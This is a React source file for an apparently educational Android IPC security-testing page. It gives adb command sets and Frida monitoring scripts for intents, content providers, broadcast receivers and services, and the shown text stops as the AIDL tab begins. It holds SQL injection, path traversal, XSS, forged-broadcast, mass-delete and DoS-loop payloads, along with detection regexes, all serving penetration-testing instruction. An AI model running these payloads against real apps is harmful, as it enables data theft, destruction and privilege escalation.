
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Shield, Radio, Database, MessageSquare, Broadcast, Server } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const AndroidIPCAnalysis: React.FC = () => {
  return (
    <div className="space-y-6">
      <Card className="bg-cybr-card border-cybr-muted">
        <CardHeader>
          <CardTitle className="text-cybr-primary flex items-center gap-2">
            <Shield className="h-6 w-6" />
            Android IPC Security Analysis
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="mb-6 p-4 bg-cybr-muted/20 rounded-lg">
            <p className="text-cybr-foreground">
              Inter-Process Communication (IPC) is fundamental to Android's architecture but introduces significant 
              attack surface. This comprehensive analysis covers Intent security, Content Provider vulnerabilities, 
              Broadcast Receiver attacks, Service exploitation, and AIDL interface security. Understanding IPC 
              vulnerabilities is crucial for identifying privilege escalation, data exposure, and component hijacking attacks.
            </p>
          </div>

          <Tabs defaultValue="intent-security" className="w-full">
            <TabsList className="grid grid-cols-6 w-full mb-6">
              <TabsTrigger value="intent-security">Intent Security</TabsTrigger>
              <TabsTrigger value="content-providers">Content Providers</TabsTrigger>
              <TabsTrigger value="broadcast-receivers">Broadcast Receivers</TabsTrigger>
              <TabsTrigger value="service-security">Service Security</TabsTrigger>
              <TabsTrigger value="aidl-analysis">AIDL Analysis</TabsTrigger>
              <TabsTrigger value="deep-links">Deep Links</TabsTrigger>
            </TabsList>

            <TabsContent value="intent-security" className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Intent Security Testing</h3>
              <p className="text-cybr-foreground/80 mb-4">
                Intents are the primary mechanism for component communication in Android. Intent vulnerabilities 
                can lead to unauthorized activity launching, service hijacking, and sensitive data exposure 
                through Intent extras and implicit Intent resolution.
              </p>

              <div className="space-y-4">
                <h4 className="text-lg font-medium text-cybr-secondary">Intent Fuzzing and Exploitation</h4>
                <CodeExample
                  language="bash"
                  title="Comprehensive Intent Security Testing"
                  code={`# List all exported activities
adb shell dumpsys package com.example.app | grep -A 5 "Activity"

# Test exported activities with various Intent extras
adb shell am start -n com.example.app/.MainActivity
adb shell am start -n com.example.app/.LoginActivity
adb shell am start -n com.example.app/.AdminActivity

# Intent fuzzing with malicious extras
adb shell am start -n com.example.app/.MainActivity \\
  --es "username" "admin" \\
  --es "password" "' OR 1=1--" \\
  --ez "isAdmin" true \\
  --ei "userId" -1 \\
  --el "amount" 999999999

# Test with oversized data
adb shell am start -n com.example.app/.MainActivity \\
  --es "data" "$(python -c 'print("A"*10000)')"

# Intent injection attacks
adb shell am start -n com.example.app/.WebViewActivity \\
  --es "url" "javascript:alert('XSS')"

# Deep link testing
adb shell am start -a android.intent.action.VIEW \\
  -d "myapp://admin/delete?id=../../../etc/passwd"

# File URI attacks
adb shell am start -n com.example.app/.FileViewerActivity \\
  --es "filepath" "file:///data/data/com.victim.app/databases/users.db"

# Content URI attacks  
adb shell am start -n com.example.app/.MediaActivity \\
  --es "uri" "content://com.victim.app.provider/users"

# Intent redirection attacks
adb shell am start -n com.example.app/.ForwardingActivity \\
  --es "target" "com.victim.app/.SensitiveActivity" \\
  --es "action" "android.intent.action.SEND" \\
  --es "data" "sensitive_data"

# Pending Intent attacks
adb shell am start -n com.example.app/.NotificationActivity \\
  --es "pendingAction" "com.victim.app.DELETE_ALL_DATA"`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">Runtime Intent Monitoring</h4>
                <CodeExample
                  language="javascript"
                  title="Intent Security Analysis with Frida"
                  code={`Java.perform(function() {
    console.log("[+] Intent Security Monitoring Started");
    
    // Hook Activity.startActivity()
    var Activity = Java.use("android.app.Activity");
    Activity.startActivity.overload('android.content.Intent').implementation = function(intent) {
        console.log("[+] Activity.startActivity() called");
        this.logIntentDetails(intent, "startActivity");
        return this.startActivity(intent);
    };
    
    // Hook Activity.startActivityForResult()
    Activity.startActivityForResult.overload('android.content.Intent', 'int').implementation = function(intent, requestCode) {
        console.log("[+] Activity.startActivityForResult() called");
        console.log("    Request Code: " + requestCode);
        this.logIntentDetails(intent, "startActivityForResult");
        return this.startActivityForResult(intent, requestCode);
    };
    
    // Hook Context.startService()
    var ContextImpl = Java.use("android.app.ContextImpl");
    ContextImpl.startService.implementation = function(intent) {
        console.log("[+] Context.startService() called");
        this.logIntentDetails(intent, "startService");
        return this.startService(intent);
    };
    
    // Hook Context.sendBroadcast()
    ContextImpl.sendBroadcast.overload('android.content.Intent').implementation = function(intent) {
        console.log("[+] Context.sendBroadcast() called");
        this.logIntentDetails(intent, "sendBroadcast");
        return this.sendBroadcast(intent);
    };
    
    // Hook Intent creation
    var Intent = Java.use("android.content.Intent");
    Intent.$init.overload('java.lang.String').implementation = function(action) {
        console.log("[+] Intent created with action: " + action);
        
        // Check for sensitive actions
        var sensitiveActions = [
            "android.intent.action.CALL",
            "android.intent.action.SEND_SMS",
            "android.intent.action.CAMERA",
            "android.intent.action.RECORD_AUDIO"
        ];
        
        if (sensitiveActions.includes(action)) {
            console.log("[!] SENSITIVE INTENT ACTION: " + action);
        }
        
        return this.$init(action);
    };
    
    // Hook Intent.putExtra() methods
    Intent.putExtra.overload('java.lang.String', 'java.lang.String').implementation = function(name, value) {
        console.log("[+] Intent.putExtra(String) called");
        console.log("    Key: " + name);
        console.log("    Value: " + value);
        
        // Check for sensitive data patterns
        var sensitivePatterns = [
            /password/i, /secret/i, /token/i, /key/i,
            /credit/i, /ssn/i, /phone/i, /email/i
        ];
        
        for (var i = 0; i < sensitivePatterns.length; i++) {
            if (name.match(sensitivePatterns[i]) || value.match(sensitivePatterns[i])) {
                console.log("[!] SENSITIVE DATA IN INTENT EXTRA");
                console.log("    Pattern: " + sensitivePatterns[i]);
                break;
            }
        }
        
        return this.putExtra(name, value);
    };
    
    // Helper function to log Intent details
    Activity.logIntentDetails = function(intent, operation) {
        try {
            var action = intent.getAction();
            var component = intent.getComponent();
            var data = intent.getData();
            var extras = intent.getExtras();
            
            console.log("  Intent Details for " + operation + ":");
            if (action) console.log("    Action: " + action);
            if (component) console.log("    Component: " + component.flattenToString());
            if (data) console.log("    Data: " + data.toString());
            
            if (extras) {
                var keySet = extras.keySet();
                var iterator = keySet.iterator();
                console.log("    Extras:");
                
                while (iterator.hasNext()) {
                    var key = iterator.next();
                    try {
                        var value = extras.get(key);
                        console.log("      " + key + " = " + value);
                    } catch(e) {
                        console.log("      " + key + " = <complex object>");
                    }
                }
            }
            
            // Check for Intent flags
            var flags = intent.getFlags();
            if (flags !== 0) {
                console.log("    Flags: 0x" + flags.toString(16));
                
                // Check for dangerous flags
                var FLAG_GRANT_READ_URI_PERMISSION = 0x00000001;
                var FLAG_GRANT_WRITE_URI_PERMISSION = 0x00000002;
                var FLAG_GRANT_PERSISTABLE_URI_PERMISSION = 0x00000040;
                
                if (flags & FLAG_GRANT_READ_URI_PERMISSION) {
                    console.log("[!] Intent grants READ URI permission");
                }
                if (flags & FLAG_GRANT_WRITE_URI_PERMISSION) {
                    console.log("[!] Intent grants WRITE URI permission");
                }
                if (flags & FLAG_GRANT_PERSISTABLE_URI_PERMISSION) {
                    console.log("[!] Intent grants PERSISTABLE URI permission");
                }
            }
            
        } catch(e) {
            console.log("[-] Error logging Intent details: " + e);
        }
    };
    
    // Hook PendingIntent creation
    try {
        var PendingIntent = Java.use("android.app.PendingIntent");
        
        PendingIntent.getActivity.overload(
            'android.content.Context', 'int', 'android.content.Intent', 'int'
        ).implementation = function(context, requestCode, intent, flags) {
            console.log("[+] PendingIntent.getActivity() called");
            console.log("    Request Code: " + requestCode);
            console.log("    Flags: 0x" + flags.toString(16));
            
            // Check for mutable PendingIntent (security risk)
            var FLAG_IMMUTABLE = 0x04000000;
            if (!(flags & FLAG_IMMUTABLE)) {
                console.log("[!] MUTABLE PENDING INTENT - SECURITY RISK");
            }
            
            this.logIntentDetails(intent, "PendingIntent.getActivity");
            return this.getActivity(context, requestCode, intent, flags);
        };
        
    } catch(e) {
        console.log("[-] PendingIntent hooking failed: " + e);
    }
});`}
                />
              </div>
            </TabsContent>

            <TabsContent value="content-providers" className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Content Provider Security Analysis</h3>
              <p className="text-cybr-foreground/80 mb-4">
                Content Providers expose application data to other apps and are a common source of data leakage. 
                This analysis covers SQL injection in Content Providers, path traversal attacks, permission bypass, 
                and unauthorized data access through content URI manipulation.
              </p>

              <div className="space-y-4">
                <h4 className="text-lg font-medium text-cybr-secondary">Content Provider Enumeration</h4>
                <CodeExample
                  language="bash"
                  title="Content Provider Discovery and Testing"
                  code={`# List all Content Providers
adb shell dumpsys package com.example.app | grep -A 10 "Provider"

# Get provider authorities
adb shell content query --uri content://com.example.app.provider/

# Test different content URIs
adb shell content query --uri content://com.example.app.provider/users
adb shell content query --uri content://com.example.app.provider/users/1
adb shell content query --uri content://com.example.app.provider/admin
adb shell content query --uri content://com.example.app.provider/settings

# SQL Injection testing
adb shell content query --uri "content://com.example.app.provider/users" \\
  --where "username='admin' OR '1'='1'"

adb shell content query --uri "content://com.example.app.provider/users" \\
  --where "id=1; DROP TABLE users;--"

# Path traversal attacks
adb shell content query --uri "content://com.example.app.provider/../../../etc/passwd"
adb shell content query --uri "content://com.example.app.provider/users/../admin"

# Insert malicious data
adb shell content insert --uri content://com.example.app.provider/users \\
  --bind name:s:"'; DROP TABLE users; --" \\
  --bind email:s:"<script>alert('xss')</script>"

# Update attacks
adb shell content update --uri content://com.example.app.provider/users \\
  --where "id=1" \\
  --bind role:s:"admin" \\
  --bind permissions:s:"all"

# Delete attacks
adb shell content delete --uri content://com.example.app.provider/users \\
  --where "1=1"

# Bulk operations
adb shell content query --uri content://com.example.app.provider/users \\
  --projection "*" | head -50

# File provider attacks (if FileProvider is exposed)
adb shell content query --uri "content://com.example.app.fileprovider/../../../data/data/com.example.app/databases/users.db"

# Test with different projection columns
adb shell content query --uri content://com.example.app.provider/users \\
  --projection "password,secret_key,private_data"`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">Content Provider Runtime Analysis</h4>
                <CodeExample
                  language="javascript"
                  title="Content Provider Security Monitoring"
                  code={`Java.perform(function() {
    console.log("[+] Content Provider Security Monitoring Started");
    
    // Hook ContentProvider methods
    var ContentProvider = Java.use("android.content.ContentProvider");
    
    // Hook query method
    ContentProvider.query.overload(
        'android.net.Uri',
        '[Ljava.lang.String;',
        'java.lang.String',
        '[Ljava.lang.String;',
        'java.lang.String'
    ).implementation = function(uri, projection, selection, selectionArgs, sortOrder) {
        console.log("[+] ContentProvider.query() called");
        console.log("    URI: " + uri.toString());
        console.log("    Projection: " + (projection ? projection.join(", ") : "null"));
        console.log("    Selection: " + selection);
        console.log("    Selection Args: " + (selectionArgs ? selectionArgs.join(", ") : "null"));
        console.log("    Sort Order: " + sortOrder);
        
        // Check for SQL injection patterns
        if (selection && this.checkSQLInjection(selection)) {
            console.log("[!] POTENTIAL SQL INJECTION IN SELECTION");
        }
        
        if (selectionArgs) {
            for (var i = 0; i < selectionArgs.length; i++) {
                if (this.checkSQLInjection(selectionArgs[i])) {
                    console.log("[!] POTENTIAL SQL INJECTION IN SELECTION ARGS[" + i + "]");
                }
            }
        }
        
        var result = this.query(uri, projection, selection, selectionArgs, sortOrder);
        
        // Log result count
        if (result) {
            console.log("    Result count: " + result.getCount());
        }
        
        return result;
    };
    
    // Hook insert method
    ContentProvider.insert.implementation = function(uri, values) {
        console.log("[+] ContentProvider.insert() called");
        console.log("    URI: " + uri.toString());
        
        if (values) {
            var keySet = values.keySet();
            var iterator = keySet.iterator();
            console.log("    Values:");
            
            while (iterator.hasNext()) {
                var key = iterator.next();
                var value = values.get(key);
                console.log("      " + key + " = " + value);
                
                // Check for malicious content
                if (this.checkMaliciousContent(key, value)) {
                    console.log("[!] POTENTIALLY MALICIOUS CONTENT IN INSERT");
                }
            }
        }
        
        return this.insert(uri, values);
    };
    
    // Hook update method
    ContentProvider.update.implementation = function(uri, values, selection, selectionArgs) {
        console.log("[+] ContentProvider.update() called");
        console.log("    URI: " + uri.toString());
        console.log("    Selection: " + selection);
        
        // Check for privilege escalation attempts
        if (values) {
            var keySet = values.keySet();
            var iterator = keySet.iterator();
            var privilegeFields = ['role', 'permission', 'admin', 'privilege', 'access_level'];
            
            while (iterator.hasNext()) {
                var key = iterator.next();
                var value = values.get(key);
                
                if (privilegeFields.includes(key.toLowerCase())) {
                    console.log("[!] POTENTIAL PRIVILEGE ESCALATION ATTEMPT");
                    console.log("    Field: " + key + " = " + value);
                }
            }
        }
        
        return this.update(uri, values, selection, selectionArgs);
    };
    
    // Hook delete method
    ContentProvider.delete.implementation = function(uri, selection, selectionArgs) {
        console.log("[+] ContentProvider.delete() called");
        console.log("    URI: " + uri.toString());
        console.log("    Selection: " + selection);
        
        // Check for mass deletion attempts
        if (!selection || selection === "1=1" || selection.includes("OR")) {
            console.log("[!] POTENTIAL MASS DELETION ATTEMPT");
        }
        
        return this.delete(uri, selection, selectionArgs);
    };
    
    // Hook openFile method (for FileProvider)
    ContentProvider.openFile.implementation = function(uri, mode) {
        console.log("[+] ContentProvider.openFile() called");
        console.log("    URI: " + uri.toString());
        console.log("    Mode: " + mode);
        
        // Check for path traversal
        var path = uri.getPath();
        if (path && (path.includes("../") || path.includes("..\\\\") || path.includes("%2e%2e"))) {
            console.log("[!] POTENTIAL PATH TRAVERSAL ATTACK");
            console.log("    Path: " + path);
        }
        
        return this.openFile(uri, mode);
    };
    
    // Helper function to check SQL injection patterns
    ContentProvider.checkSQLInjection = function(input) {
        if (!input) return false;
        
        var sqlPatterns = [
            /('|(\\x27)|(\\x2D\\x2D)|(%27)|(%2D%2D))/i,
            /(union|select|insert|delete|update|drop|create|alter|exec|execute)/i,
            /((\\x3D)|(=))[^\\s]*(('|(\\x27)|(\\x2D\\x2D)|(%27)|(%2D%2D))/i,
            /(or|and)\\s+(1=1|true|false)/i
        ];
        
        for (var i = 0; i < sqlPatterns.length; i++) {
            if (sqlPatterns[i].test(input)) {
                return true;
            }
        }
        return false;
    };
    
    // Helper function to check malicious content
    ContentProvider.checkMaliciousContent = function(key, value) {
        if (!key || !value) return false;
        
        var maliciousPatterns = [
            /<script/i,
            /javascript:/i,
            /vbscript:/i,
            /on(load|error|click|focus)/i,
            /expression\\s*\\(/i
        ];
        
        var valueStr = value.toString();
        for (var i = 0; i < maliciousPatterns.length; i++) {
            if (maliciousPatterns[i].test(valueStr)) {
                return true;
            }
        }
        return false;
    };
    
    // Hook UriMatcher for custom providers
    try {
        var UriMatcher = Java.use("android.content.UriMatcher");
        UriMatcher.match.implementation = function(uri) {
            var result = this.match(uri);
            console.log("[+] UriMatcher.match() called");
            console.log("    URI: " + uri.toString());
            console.log("    Match result: " + result);
            
            return result;
        };
    } catch(e) {
        console.log("[-] UriMatcher hooking failed: " + e);
    }
});`}
                />
              </div>
            </TabsContent>

            <TabsContent value="broadcast-receivers" className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Broadcast Receiver Security Testing</h3>
              <p className="text-cybr-foreground/80 mb-4">
                Broadcast Receivers listen for system and application events, creating opportunities for attackers 
                to trigger unintended functionality or intercept sensitive broadcasts. This analysis covers broadcast 
                hijacking, intent interception, and unauthorized receiver triggering.
              </p>

              <div className="space-y-4">
                <h4 className="text-lg font-medium text-cybr-secondary">Broadcast Receiver Exploitation</h4>
                <CodeExample
                  language="bash"
                  title="Broadcast Receiver Attack Testing"
                  code={`# List all broadcast receivers
adb shell dumpsys package com.example.app | grep -A 10 "Receiver"

# Send custom broadcasts to exported receivers
adb shell am broadcast -a com.example.app.CUSTOM_ACTION
adb shell am broadcast -a com.example.app.LOGIN_SUCCESS
adb shell am broadcast -a com.example.app.ADMIN_UNLOCK

# Broadcast with malicious extras
adb shell am broadcast -a com.example.app.USER_DATA \\
  --es "username" "admin" \\
  --es "password" "hacked" \\
  --ez "isAdmin" true \\
  --ei "userId" -1

# System broadcast interception
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED
adb shell am broadcast -a android.intent.action.PACKAGE_INSTALL
adb shell am broadcast -a android.net.conn.CONNECTIVITY_CHANGE

# SMS broadcast hijacking (requires permissions)
adb shell am broadcast -a android.provider.Telephony.SMS_RECEIVED \\
  --es "pdus" "malicious_sms_data"

# Ordered broadcast attacks
adb shell am broadcast -a com.example.app.ORDERED_ACTION \\
  --es "data" "modified_by_attacker" \\
  --ordered

# Broadcast to specific component
adb shell am broadcast -n com.example.app/.MyBroadcastReceiver \\
  -a com.example.app.SPECIFIC_ACTION

# Local broadcast testing (won't work externally but test for logic flaws)
adb shell am broadcast -a com.example.app.LOCAL_ACTION

# Priority manipulation testing
adb shell am broadcast -a com.example.app.HIGH_PRIORITY \\
  --ei "priority" 999999

# Broadcast storm testing (DoS)
for i in {1..100}; do
  adb shell am broadcast -a com.example.app.TEST_ACTION --ei "count" $i &
done

# Sticky broadcast testing (deprecated but may still be used)
adb shell am broadcast -a com.example.app.STICKY_ACTION --sticky`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">Broadcast Security Monitoring</h4>
                <CodeExample
                  language="javascript"
                  title="Broadcast Receiver Security Analysis"
                  code={`Java.perform(function() {
    console.log("[+] Broadcast Receiver Security Monitoring Started");
    
    // Hook BroadcastReceiver.onReceive()
    var BroadcastReceiver = Java.use("android.content.BroadcastReceiver");
    BroadcastReceiver.onReceive.implementation = function(context, intent) {
        console.log("[+] BroadcastReceiver.onReceive() called");
        
        var action = intent.getAction();
        console.log("    Action: " + action);
        
        // Log Intent details
        this.logBroadcastDetails(intent);
        
        // Check for sensitive actions
        var sensitiveActions = [
            "android.intent.action.BOOT_COMPLETED",
            "android.provider.Telephony.SMS_RECEIVED",
            "android.net.conn.CONNECTIVITY_CHANGE",
            "android.intent.action.PACKAGE_INSTALL"
        ];
        
        if (sensitiveActions.includes(action)) {
            console.log("[!] SENSITIVE BROADCAST RECEIVED: " + action);
        }
        
        // Check for custom app actions that might be sensitive
        if (action && action.includes("ADMIN") || action.includes("UNLOCK") || action.includes("AUTH")) {
            console.log("[!] POTENTIALLY SENSITIVE CUSTOM ACTION: " + action);
        }
        
        return this.onReceive(context, intent);
    };
    
    // Hook Context.sendBroadcast()
    var ContextImpl = Java.use("android.app.ContextImpl");
    ContextImpl.sendBroadcast.overload('android.content.Intent').implementation = function(intent) {
        console.log("[+] Context.sendBroadcast() called");
        this.logBroadcastDetails(intent);
        
        // Check if broadcast contains sensitive data
        var extras = intent.getExtras();
        if (extras && this.containsSensitiveData(extras)) {
            console.log("[!] SENSITIVE DATA IN BROADCAST");
        }
        
        return this.sendBroadcast(intent);
    };
    
    // Hook sendOrderedBroadcast()
    ContextImpl.sendOrderedBroadcast.overload(
        'android.content.Intent',
        'java.lang.String'
    ).implementation = function(intent, receiverPermission) {
        console.log("[+] Context.sendOrderedBroadcast() called");
        console.log("    Required Permission: " + receiverPermission);
        this.logBroadcastDetails(intent);
        
        if (!receiverPermission) {
            console.log("[!] ORDERED BROADCAST WITHOUT PERMISSION REQUIREMENT");
        }
        
        return this.sendOrderedBroadcast(intent, receiverPermission);
    };
    
    // Hook LocalBroadcastManager
    try {
        var LocalBroadcastManager = Java.use("androidx.localbroadcastmanager.content.LocalBroadcastManager");
        LocalBroadcastManager.sendBroadcast.implementation = function(intent) {
            console.log("[+] LocalBroadcastManager.sendBroadcast() called");
            this.logBroadcastDetails(intent);
            return this.sendBroadcast(intent);
        };
    } catch(e) {
        console.log("[-] LocalBroadcastManager not found");
    }
    
    // Hook dynamic receiver registration
    ContextImpl.registerReceiver.overload(
        'android.content.BroadcastReceiver',
        'android.content.IntentFilter'
    ).implementation = function(receiver, filter) {
        console.log("[+] Context.registerReceiver() called");
        
        if (filter) {
            for (var i = 0; i < filter.countActions(); i++) {
                var action = filter.getAction(i);
                console.log("    Listening for action: " + action);
                
                // Check for dangerous action registration
                if (action.includes("SMS") || action.includes("CALL") || action.includes("BOOT")) {
                    console.log("[!] RECEIVER REGISTERED FOR SENSITIVE ACTION: " + action);
                }
            }
            
            // Check priority
            var priority = filter.getPriority();
            if (priority > 0) {
                console.log("    Priority: " + priority);
                if (priority >= 1000) {
                    console.log("[!] HIGH PRIORITY RECEIVER - POTENTIAL BROADCAST HIJACKING");
                }
            }
        }
        
        return this.registerReceiver(receiver, filter);
    };
    
    // Helper function to log broadcast details
    BroadcastReceiver.logBroadcastDetails = ContextImpl.logBroadcastDetails = function(intent) {
        try {
            var action = intent.getAction();
            var data = intent.getData();
            var extras = intent.getExtras();
            var component = intent.getComponent();
            
            if (action) console.log("    Action: " + action);
            if (data) console.log("    Data: " + data.toString());
            if (component) console.log("    Component: " + component.flattenToString());
            
            if (extras) {
                var keySet = extras.keySet();
                var iterator = keySet.iterator();
                console.log("    Extras:");
                
                while (iterator.hasNext()) {
                    var key = iterator.next();
                    try {
                        var value = extras.get(key);
                        console.log("      " + key + " = " + value);
                    } catch(e) {
                        console.log("      " + key + " = <complex object>");
                    }
                }
            }
        } catch(e) {
            console.log("[-] Error logging broadcast details: " + e);
        }
    };
    
    // Helper function to check for sensitive data
    ContextImpl.containsSensitiveData = function(extras) {
        try {
            var keySet = extras.keySet();
            var iterator = keySet.iterator();
            var sensitivePatterns = [
                /password/i, /secret/i, /token/i, /key/i,
                /credit/i, /ssn/i, /phone/i, /email/i,
                /admin/i, /auth/i, /login/i
            ];
            
            while (iterator.hasNext()) {
                var key = iterator.next();
                var value = extras.get(key);
                
                if (value) {
                    var keyStr = key.toString();
                    var valueStr = value.toString();
                    
                    for (var i = 0; i < sensitivePatterns.length; i++) {
                        if (sensitivePatterns[i].test(keyStr) || sensitivePatterns[i].test(valueStr)) {
                            return true;
                        }
                    }
                }
            }
            return false;
        } catch(e) {
            return false;
        }
    };
    
    // Hook IntentFilter creation to monitor what apps listen for
    try {
        var IntentFilter = Java.use("android.content.IntentFilter");
        IntentFilter.addAction.implementation = function(action) {
            console.log("[+] IntentFilter.addAction(): " + action);
            
            if (action.includes("android.provider.Telephony") || 
                action.includes("android.intent.action.BOOT") ||
                action.includes("CONNECTIVITY_CHANGE")) {
                console.log("[!] APP LISTENING FOR SENSITIVE SYSTEM ACTION");
            }
            
            return this.addAction(action);
        };
    } catch(e) {
        console.log("[-] IntentFilter hooking failed: " + e);
    }
});`}
                />
              </div>
            </TabsContent>

            <TabsContent value="service-security" className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Service Security Analysis</h3>
              <p className="text-cybr-foreground/80 mb-4">
                Android Services run in the background and can be exploited if not properly secured. This analysis 
                covers exported service attacks, service hijacking, unauthorized service binding, and background 
                service exploitation for privilege escalation and data access.
              </p>

              <div className="space-y-4">
                <h4 className="text-lg font-medium text-cybr-secondary">Service Exploitation Testing</h4>
                <CodeExample
                  language="bash"
                  title="Service Security Testing Commands"
                  code={`# List all services
adb shell dumpsys package com.example.app | grep -A 10 "Service"

# Start exported services
adb shell am startservice -n com.example.app/.BackgroundService
adb shell am startservice -n com.example.app/.SyncService
adb shell am startservice -n com.example.app/.AdminService

# Start services with malicious intents
adb shell am startservice -n com.example.app/.FileService \\
  --es "action" "delete" \\
  --es "path" "/data/data/com.victim.app/"

adb shell am startservice -n com.example.app/.DatabaseService \\
  --es "query" "DROP TABLE users;" \\
  --es "operation" "execute"

# Test service with oversized data
adb shell am startservice -n com.example.app/.ProcessingService \\
  --es "data" "$(python -c 'print("A"*100000)')"

# Bound service testing (requires custom client)
# This would typically be done through a custom app or script

# Test service persistence after app termination
adb shell am force-stop com.example.app
adb shell am startservice -n com.example.app/.PersistentService

# Service DoS testing
for i in {1..50}; do
  adb shell am startservice -n com.example.app/.TestService --ei "request" $i &
done

# Test foreground service manipulation
adb shell am startservice -n com.example.app/.NotificationService \\
  --es "title" "<script>alert('XSS')</script>" \\
  --es "content" "Malicious notification content"

# AIDL service testing (if AIDL interfaces are exposed)
# This requires custom client code to test properly

# Service with file operations
adb shell am startservice -n com.example.app/.FileManagerService \\
  --es "operation" "read" \\
  --es "file" "../../../etc/passwd"

# Background execution limits bypass testing (Android 8+)
adb shell am startservice -n com.example.app/.LongRunningService \\
  --es "duration" "3600"  # 1 hour`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">Service Security Monitoring</h4>
                <CodeExample
                  language="javascript"
                  title="Service Security Analysis with Frida"
                  code={`Java.perform(function() {
    console.log("[+] Service Security Monitoring Started");
    
    // Hook Service lifecycle methods
    var Service = Java.use("android.app.Service");
    
    Service.onCreate.implementation = function() {
        console.log("[+] Service.onCreate() called");
        console.log("    Service: " + this.getClass().getName());
        return this.onCreate();
    };
    
    Service.onStartCommand.implementation = function(intent, flags, startId) {
        console.log("[+] Service.onStartCommand() called");
        console.log("    Service: " + this.getClass().getName());
        console.log("    Start ID: " + startId);
        console.log("    Flags: " + flags);
        
        if (intent) {
            this.logServiceIntent(intent);
        }
        
        var result = this.onStartCommand(intent, flags, startId);
        console.log("    Return value: " + result);
        
        return result;
    };
    
    Service.onBind.implementation = function(intent) {
        console.log("[+] Service.onBind() called");
        console.log("    Service: " + this.getClass().getName());
        
        if (intent) {
            this.logServiceIntent(intent);
        }
        
        var binder = this.onBind(intent);
        if (binder) {
            console.log("    Binder returned: " + binder.getClass().getName());
            console.log("[!] SERVICE BINDING ALLOWED - CHECK PERMISSIONS");
        }
        
        return binder;
    };
    
    // Hook Context.startService()
    var ContextImpl = Java.use("android.app.ContextImpl");
    ContextImpl.startService.implementation = function(service) {
        console.log("[+] Context.startService() called");
        
        if (service) {
            var component = service.getComponent();
            if (component) {
                console.log("    Target Service: " + component.flattenToString());
            }
            this.logServiceIntent(service);
        }
        
        return this.startService(service);
    };
    
    // Hook Context.bindService()
    ContextImpl.bindService.overload(
        'android.content.Intent',
        'android.content.ServiceConnection',
        'int'
    ).implementation = function(service, conn, flags) {
        console.log("[+] Context.bindService() called");
        console.log("    Flags: " + flags);
        
        if (service) {
            var component = service.getComponent();
            if (component) {
                console.log("    Target Service: " + component.flattenToString());
            }
            this.logServiceIntent(service);
        }
        
        var result = this.bindService(service, conn, flags);
        console.log("    Bind result: " + result);
        
        return result;
    };
    
    // Hook IntentService (commonly used for background tasks)
    try {
        var IntentService = Java.use("android.app.IntentService");
        IntentService.onHandleIntent.implementation = function(intent) {
            console.log("[+] IntentService.onHandleIntent() called");
            console.log("    Service: " + this.getClass().getName());
            
            if (intent) {
                this.logServiceIntent(intent);
            }
            
            return this.onHandleIntent(intent);
        };
    } catch(e) {
        console.log("[-] IntentService not found or not used");
    }
    
    // Hook JobIntentService (modern replacement for IntentService)
    try {
        var JobIntentService = Java.use("androidx.core.app.JobIntentService");
        JobIntentService.onHandleWork.implementation = function(intent) {
            console.log("[+] JobIntentService.onHandleWork() called");
            console.log("    Service: " + this.getClass().getName());
            
            if (intent) {
                this.logServiceIntent(intent);
            }
            
            return this.onHandleWork(intent);
        };
    } catch(e) {
        console.log("[-] JobIntentService not found");
    }
    
    // Hook Binder transactions (for AIDL services)
    try {
        var Binder = Java.use("android.os.Binder");
        Binder.onTransact.implementation = function(code, data, reply, flags) {
            console.log("[+] Binder.onTransact() called");
            console.log("    Binder: " + this.getClass().getName());
            console.log("    Transaction code: " + code);
            console.log("    Flags: " + flags);
            
            // Check for one-way calls (potential for abuse)
            var FLAG_ONEWAY = 0x01;
            if (flags & FLAG_ONEWAY) {
                console.log("[!] ONE-WAY BINDER CALL");
            }
            
            try {
                var result = this.onTransact(code, data, reply, flags);
                console.log("    Transaction result: " + result);
                return result;
            } catch(e) {
                console.log("[-] Binder transaction failed: " + e);
                throw e;
            }
        };
    } catch(e) {
        console.log("[-] Binder hooking failed: " + e);
    }
    
    // Helper function to log service intent details
    Service.logServiceIntent = ContextImpl.logServiceIntent = function(intent) {
        try {
            var action = intent.getAction();
            var data = intent.getData();
            var extras = intent.getExtras();
            var component = intent.getComponent();
            
            console.log("  Intent Details:");
            if (action) console.log("    Action: " + action);
            if (data) console.log("    Data: " + data.toString());
            if (component) console.log("    Component: " + component.flattenToString());
            
            if (extras) {
                var keySet = extras.keySet();
                var iterator = keySet.iterator();
                console.log("    Extras:");
                
                while (iterator.hasNext()) {
                    var key = iterator.next();
                    try {
                        var value = extras.get(key);
                        console.log("      " + key + " = " + value);
                        
                        // Check for sensitive operations
                        if (key.toLowerCase().includes("file") || 
                            key.toLowerCase().includes("path") ||
                            key.toLowerCase().includes("query")) {
                            console.log("[!] POTENTIALLY DANGEROUS OPERATION: " + key);
                        }
                        
                    } catch(e) {
                        console.log("      " + key + " = <complex object>");
                    }
                }
            }
        } catch(e) {
            console.log("[-] Error logging service intent: " + e);
        }
    };
    
    // Hook Messenger (for cross-process communication)
    try {
        var Messenger = Java.use("android.os.Messenger");
        Messenger.send.implementation = function(message) {
            console.log("[+] Messenger.send() called");
            
            if (message) {
                console.log("    Message what: " + message.what);
                console.log("    Message arg1: " + message.arg1);
                console.log("    Message arg2: " + message.arg2);
                
                var data = message.getData();
                if (data && !data.isEmpty()) {
                    console.log("[!] MESSAGE CONTAINS DATA - POTENTIAL IPC ATTACK VECTOR");
                }
            }
            
            return this.send(message);
        };
    } catch(e) {
        console.log("[-] Messenger hooking failed: " + e);
    }
});`}
                />
              </div>
            </TabsContent>

            <TabsContent value="aidl-analysis" className="space-y-4">
              <h3 className="text-xl font-semibent text-cybr-primary">AIDL Interface Security Analysis</h3>
              <p className="text-cybr-foreground/80 mb-4">
                Android Interface Definition Language (AIDL) enables cross-process communication with type safety 
                but can introduce security vulnerabilities if not properly implemented. This analysis covers AIDL 
                interface enumeration, method fuzzing, permission bypass, and inter-process attack vectors.
              </p>

              <div className="space-y-4">
